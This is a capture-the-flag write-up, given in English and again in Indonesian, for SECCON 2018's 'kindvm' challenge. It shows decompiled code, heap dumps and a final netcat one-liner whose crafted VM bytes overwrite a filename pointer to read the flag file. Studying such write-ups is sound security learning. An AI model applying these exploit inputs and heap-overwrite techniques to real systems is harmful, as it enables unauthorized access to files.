# kindvm
---
**Points:** 255 | **Solves:** 64/653 | **Category:** Pwn

Get hints, and pwn it! kindvm.pwn.seccon.jp 12345

[Download](kindvm_79726158fec11eb1e5a89351db017e13506d3a4a)

---

[Bahasa Indonesia](#bahasa-indonesia)

## English
```
Input your name : a
Input instruction : a
 _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
Error! Try again!
```

The binary takes instructions as input (per-byte) and run it.
Here are the instructions.
```
0 -> insn_nop;
1 -> insn_load;
2 -> insn_store;
3 -> insn_mov;
4 -> insn_add;
5 -> insn_sub;
6 -> insn_halt;
7 -> insn_in;
8 -> insn_out;
9 -> insn_hint;
```

Wait, the binary have gets in input name!
Let's exploit it!
```cpp
char *input_username()
{
  char *dest; // ST18_4
  size_t v1; // eax
  char s; // [esp+12h] [ebp-16h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  printf("Input your name : ");
  gets(&s);
  dest = (char *)malloc(0xAu);
  v1 = strlen(&s);
  dest[9] = 0;
  strncpy(dest, &s, v1);
  return dest;
}
```

Well.
```
Input your name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 _   _ _       _   _    ____ _____ _____   _ 
| | | (_)_ __ | |_/ |  / ___| ____|_   _| | |
| |_| | | '_ \| __| | | |  _|  _|   | |   | |
|  _  | | | | | |_| | | |_| | |___  | |   |_|
|_| |_|_|_| |_|\__|_|  \____|_____| |_|   (_)
                                             

Nice try! The theme of this binary is not Stack-Based BOF!
However, your name is not meaningless...
```

Okay, moving on. Let's just call instruction 9 (hint).
```
asdf@asdf:/media/sf_SVM/seccon$ echo -e '\n\x09\n' | nc kindvm.pwn.seccon.jp 12345
Input your name : Input instruction :  _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
 _   _ _       _   ____     ____ _____ _____   _ 
| | | (_)_ __ | |_|___ \   / ___| ____|_   _| | |
| |_| | | '_ \| __| __) | | |  _|  _|   | |   | |
|  _  | | | | | |_ / __/  | |_| | |___  | |   |_|
|_| |_|_|_| |_|\__|_____|  \____|_____| |_|   (_)
                                                 
Nice try! You can analyze vm instruction and execute it!
Flag file name is "flag.txt".
```

Sure!
We also see a third hint in the binary (insn_add).
```
_DWORD *insn_add()
{
  _DWORD *result; // eax
  unsigned __int8 v1; // [esp+Ah] [ebp-Eh]
  unsigned __int8 v2; // [esp+Bh] [ebp-Dh]
  signed int v3; // [esp+Ch] [ebp-Ch]

  v1 = load_insn_uint8_t();
  v2 = load_insn_uint8_t();
  if ( v1 > 7u )
    kindvm_abort();
  if ( v2 > 7u )
    kindvm_abort();
  if ( *((_DWORD *)reg + v1) >= 0 )
    v3 = 1;
  result = (char *)reg + 4 * v1;
  *result += *((_DWORD *)reg + v2);
  if ( v3 )
  {
    result = (_DWORD *)*((_DWORD *)reg + v1);
    if ( (signed int)result < 0 )
      hint3();
  }
  return result;
```

It requires user to have reg + v1 of negative value. Let's try to load by `in` (7) function.
```cpp
int insn_in()
{
  int result; // eax
  unsigned __int8 v1; // [esp+Bh] [ebp-Dh]
  int v2; // [esp+Ch] [ebp-Ch]

  v1 = load_insn_uint8_t();
  v2 = load_insn_uint32_t();
  if ( v1 > 7u )
    kindvm_abort();
  result = v2;
  *((_DWORD *)reg + v1) = v2;
  return result;
}

int load_insn_uint32_t()
{
  unsigned __int8 *v0; // ebx
  int v1; // ST0C_4
  unsigned __int8 *v2; // ebx
  int v3; // ST0C_4
  unsigned __int8 *v4; // ebx
  int v5; // ST0C_4
  unsigned __int8 *v6; // ebx
  int v7; // ST0C_4

  v0 = (unsigned __int8 *)insn;
  v1 = v0[get_pc()];
  step();
  v2 = (unsigned __int8 *)insn;
  v3 = v2[get_pc()] + (v1 << 8);
  step();
  v4 = (unsigned __int8 *)insn;
  v5 = v4[get_pc()] + (v3 << 8);
  step();
  v6 = (unsigned __int8 *)insn;
  v7 = v6[get_pc()] + (v5 << 8);
  step();
  return v7;
}
```

Okay. So, we need to input register (0 - 7) and number (first input is the most significant byte).
Let's do reg0 = 0xffffffff and then add r0 to r0 -> r0 = -1 + -1 = -2 (still negative).
```
asdf@asdf:/media/sf_SVM/seccon$ echo -e '\n\x07\x00\xff\xff\xff\xff\x04\x00\x00\n' | nc kindvm.pwn.seccon.jp 12345
Input your name : Input instruction :  _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
 _   _ _       _   _____    ____ _____ _____   _ 
| | | (_)_ __ | |_|___ /   / ___| ____|_   _| | |
| |_| | | '_ \| __| |_ \  | |  _|  _|   | |   | |
|  _  | | | | | |_ ___) | | |_| | |___  | |   |_|
|_| |_|_|_| |_|\__|____/   \____|_____| |_|   (_)
                                                 
Nice try! You can cause Integer Overflow!
The value became minus value. Minus value is important.
```

Nice, we got (maybe) all the hints. Now, we just need to read `flag.txt`.
Some notes, `reg` is stored in heap. There is also `mem` stored in heap. We can store and load `mem` with the instruction load and store.

The hint states about integer overflow, so maybe integer overflow in heap.
Let's see what else is in the heap.
```
  v0 = malloc(0x18u);
  kc = (int)v0;
  *v0 = 0;
  *(_DWORD *)(kc + 4) = 0;
  v1 = kc;
  *(_DWORD *)(v1 + 8) = input_username();
  *(_DWORD *)(kc + 12) = "banner.txt";
  *(_DWORD *)(kc + 16) = func_greeting;
  *(_DWORD *)(kc + 20) = func_farewell;
  mem = malloc(0x400u);
  memset(mem, 0, 0x400u);
  reg = malloc(0x20u);
  memset(reg, 0, 0x20u);
  insn = malloc(0x400u);
  result = memset(mem, 65, 0x400u);
```

So, username is in the heap (hint says it is useful), also banner.txt, func_greeting, and func_farewell.
If we can overflow and write in the heap then maybe we can change func_farewell to execute anything.
Let's see what func_farewell does.
```cpp
ssize_t func_farewell()
{
  open_read_write(*(char **)(kc + 12));
  return write(1, "Execution is end! Thank you!\n", 0x1Du);
}
```

It reads `kc+12` which is `banner.txt` and writes it!
Well then, if we can change `kc+12` to `flag.txt` by rewriting it to `name` (filled with `flag.txt`), we will get the flag.
Let's see the heap then.
```
gdb-peda$ x/20wx 0x804c168
0x804c168:   0x0804c180 <= name   0x080491b2 <= banner.txt  0x08048f89 <= greeting  0x08048fba <= farewell
0x804c178:   0x00000000           0x00000011                0x00000000              0x00000000
0x804c188:   0x00000000           0x00000411                0x41414141 <= mem_stat  0x41414141
0x804c198:   0x41414141           0x41414141                0x41414141              0x41414141
0x804c1a8:   0x41414141           0x41414141                0x41414141              0x41414141
```

Plan: read `name` -> write it to `banner.txt`.
```
load mem-40 to reg0 -> store reg0 to mem-36
```

Flag is captured!
```
asdf@asdf:~/Desktop/CTF/ctf/seccon2018/classic-pwn$ echo -e 'flag.txt\n\x01\x00\xff\xd8\x02\xff\xdc\x00\x06' | nc kindvm.pwn.seccon.jp 12345
Input your name : Input instruction :  _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
SECCON{s7ead1ly_5tep_by_5tep}
Execution is end! Thank you!
```

## Bahasa Indonesia
```
Input your name : a
Input instruction : a
 _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
Error! Try again!
```

Program membaca input (1 instruksi 1 byte) dan menjalankannya.
Berikut instruksinya.
```
0 -> insn_nop;
1 -> insn_load;
2 -> insn_store;
3 -> insn_mov;
4 -> insn_add;
5 -> insn_sub;
6 -> insn_halt;
7 -> insn_in;
8 -> insn_out;
9 -> insn_hint;
```

Program memanggil `gets`! Dicoba buffer overflow.
```cpp
char *input_username()
{
  char *dest; // ST18_4
  size_t v1; // eax
  char s; // [esp+12h] [ebp-16h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  printf("Input your name : ");
  gets(&s);
  dest = (char *)malloc(0xAu);
  v1 = strlen(&s);
  dest[9] = 0;
  strncpy(dest, &s, v1);
  return dest;
}
```

Hmm.
```
Input your name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 _   _ _       _   _    ____ _____ _____   _ 
| | | (_)_ __ | |_/ |  / ___| ____|_   _| | |
| |_| | | '_ \| __| | | |  _|  _|   | |   | |
|  _  | | | | | |_| | | |_| | |___  | |   |_|
|_| |_|_|_| |_|\__|_|  \____|_____| |_|   (_)
                                             

Nice try! The theme of this binary is not Stack-Based BOF!
However, your name is not meaningless...
```

Okay, lanjut. Mari panggil instruksi 9 (hint).
```
asdf@asdf:/media/sf_SVM/seccon$ echo -e '\n\x09\n' | nc kindvm.pwn.seccon.jp 12345
Input your name : Input instruction :  _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
 _   _ _       _   ____     ____ _____ _____   _ 
| | | (_)_ __ | |_|___ \   / ___| ____|_   _| | |
| |_| | | '_ \| __| __) | | |  _|  _|   | |   | |
|  _  | | | | | |_ / __/  | |_| | |___  | |   |_|
|_| |_|_|_| |_|\__|_____|  \____|_____| |_|   (_)
                                                 
Nice try! You can analyze vm instruction and execute it!
Flag file name is "flag.txt".
```

Sip!
Dapat dilihat juga terdapat hint ketiga (insn_add).
```
_DWORD *insn_add()
{
  _DWORD *result; // eax
  unsigned __int8 v1; // [esp+Ah] [ebp-Eh]
  unsigned __int8 v2; // [esp+Bh] [ebp-Dh]
  signed int v3; // [esp+Ch] [ebp-Ch]

  v1 = load_insn_uint8_t();
  v2 = load_insn_uint8_t();
  if ( v1 > 7u )
    kindvm_abort();
  if ( v2 > 7u )
    kindvm_abort();
  if ( *((_DWORD *)reg + v1) >= 0 )
    v3 = 1;
  result = (char *)reg + 4 * v1;
  *result += *((_DWORD *)reg + v2);
  if ( v3 )
  {
    result = (_DWORD *)*((_DWORD *)reg + v1);
    if ( (signed int)result < 0 )
      hint3();
  }
  return result;
```

Untuk mendapaatkan hint nilai `reg + v1` harus negatif. Mari coba buat nilai reg negatif dengan fungsi `in` (7).
```cpp
int insn_in()
{
  int result; // eax
  unsigned __int8 v1; // [esp+Bh] [ebp-Dh]
  int v2; // [esp+Ch] [ebp-Ch]

  v1 = load_insn_uint8_t();
  v2 = load_insn_uint32_t();
  if ( v1 > 7u )
    kindvm_abort();
  result = v2;
  *((_DWORD *)reg + v1) = v2;
  return result;
}

int load_insn_uint32_t()
{
  unsigned __int8 *v0; // ebx
  int v1; // ST0C_4
  unsigned __int8 *v2; // ebx
  int v3; // ST0C_4
  unsigned __int8 *v4; // ebx
  int v5; // ST0C_4
  unsigned __int8 *v6; // ebx
  int v7; // ST0C_4

  v0 = (unsigned __int8 *)insn;
  v1 = v0[get_pc()];
  step();
  v2 = (unsigned __int8 *)insn;
  v3 = v2[get_pc()] + (v1 << 8);
  step();
  v4 = (unsigned __int8 *)insn;
  v5 = v4[get_pc()] + (v3 << 8);
  step();
  v6 = (unsigned __int8 *)insn;
  v7 = v6[get_pc()] + (v5 << 8);
  step();
  return v7;
}
```

Jadi, kita perlu memasukkan register (0 - 7) dan nilainya pada input (byte pertama pada nilai paling signifikan).
Coba reg0 = 0xffffffff dan panggil add r0 ke r0 -> r0 = -1 + -1 = -2 (seharusnya nilai masih negatif).
```
asdf@asdf:/media/sf_SVM/seccon$ echo -e '\n\x07\x00\xff\xff\xff\xff\x04\x00\x00\n' | nc kindvm.pwn.seccon.jp 12345
Input your name : Input instruction :  _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
 _   _ _       _   _____    ____ _____ _____   _ 
| | | (_)_ __ | |_|___ /   / ___| ____|_   _| | |
| |_| | | '_ \| __| |_ \  | |  _|  _|   | |   | |
|  _  | | | | | |_ ___) | | |_| | |___  | |   |_|
|_| |_|_|_| |_|\__|____/   \____|_____| |_|   (_)
                                                 
Nice try! You can cause Integer Overflow!
The value became minus value. Minus value is important.
```

Yay, dapat (mungkin) semua hint. Sekarang kita perlu membaca `flag.txt`.
Beberapa keterangan, `reg` disimpan pada heap. Selain itu ada juga `mem` yang juga disimpan di heap. Kita dapat menggunakan `mem` dengan fungsi load dan store.

Hint yaitu integer overflow, mungkin integer overflow pada heap.
Dicek apa saja yang terdapat pada heap.
```
  v0 = malloc(0x18u);
  kc = (int)v0;
  *v0 = 0;
  *(_DWORD *)(kc + 4) = 0;
  v1 = kc;
  *(_DWORD *)(v1 + 8) = input_username();
  *(_DWORD *)(kc + 12) = "banner.txt";
  *(_DWORD *)(kc + 16) = func_greeting;
  *(_DWORD *)(kc + 20) = func_farewell;
  mem = malloc(0x400u);
  memset(mem, 0, 0x400u);
  reg = malloc(0x20u);
  memset(reg, 0, 0x20u);
  insn = malloc(0x400u);
  result = memset(mem, 65, 0x400u);
```

Jadi, username terdapat pada heap (kata hint username penting), terdapat juga banner.txt, func_greeting, dan func_farewell pada heap.
Apabila kita dapat menulis dengan overflow pada heap, maka kita dapat mengubah func_farewell untuk mengeksekusi apapun.
Sebelumnya, dicek kegunaan func_farewell.
```cpp
ssize_t func_farewell()
{
  open_read_write(*(char **)(kc + 12));
  return write(1, "Execution is end! Thank you!\n", 0x1Du);
}
```

Fungsi tersebut membaca `kc+12` yang adalah `banner.txt` dan menulisnya!
Jadi, jika kita ubah `kc+12` menjadi `flag.txt` dengan mengganti menjadi `name` (berisi `flag.txt`), kita dapat flag.
Let's see the heap then.
```
gdb-peda$ x/20wx 0x804c168
0x804c168:   0x0804c180 <= name   0x080491b2 <= banner.txt  0x08048f89 <= greeting  0x08048fba <= farewell
0x804c178:   0x00000000           0x00000011                0x00000000              0x00000000
0x804c188:   0x00000000           0x00000411                0x41414141 <= mem_stat  0x41414141
0x804c198:   0x41414141           0x41414141                0x41414141              0x41414141
0x804c1a8:   0x41414141           0x41414141                0x41414141              0x41414141
```

Rencana: baca `name` -> tulis ke `banner.txt`.
```
load mem-40 to reg0 -> store reg0 to mem-36
```

Flag didapatkan!
```
asdf@asdf:~/Desktop/CTF/ctf/seccon2018/classic-pwn$ echo -e 'flag.txt\n\x01\x00\xff\xd8\x02\xff\xdc\x00\x06' | nc kindvm.pwn.seccon.jp 12345
Input your name : Input instruction :  _    _           _                 
| | _(_)_ __   __| |_   ___ __ ___  
| |/ / | '_ \ / _` \ \ / / '_ ` _ \ 
|   <| | | | | (_| |\ V /| | | | | |
|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|
                                    
Instruction start!
SECCON{s7ead1ly_5tep_by_5tep}
Execution is end! Thank you!
```
